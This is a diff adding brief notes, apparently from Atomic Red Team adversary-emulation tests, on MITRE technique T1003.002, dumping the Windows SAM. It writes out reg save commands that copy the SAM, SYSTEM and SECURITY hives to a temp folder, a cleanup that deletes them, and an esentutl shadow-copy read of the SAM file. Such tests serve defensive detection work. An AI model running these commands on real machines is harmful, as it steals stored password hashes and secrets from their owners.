@@ -22,7 +22,22 @@ https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/
 
 
 T1003.002.md
+## Atomic Test #1 - Registry dump of SAM, creds, and secrets
 
+reg save HKLM\sam %temp%\sam
+reg save HKLM\system %temp%\system
+reg save HKLM\security %temp%\security
+
+#Borrado
+del %temp%\sam >nul 2> nul
+del %temp%\system >nul 2> nul
+del %temp%\security >nul 2> nul
+
+## Atomic Test #2 - Registry parse with pypykatz
+
+## Atomic Test #3 - esentutl.exe SAM copy
+
+esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp% /SAM
 T1003.003.md
 T1003.004.md
 T1003.005.md
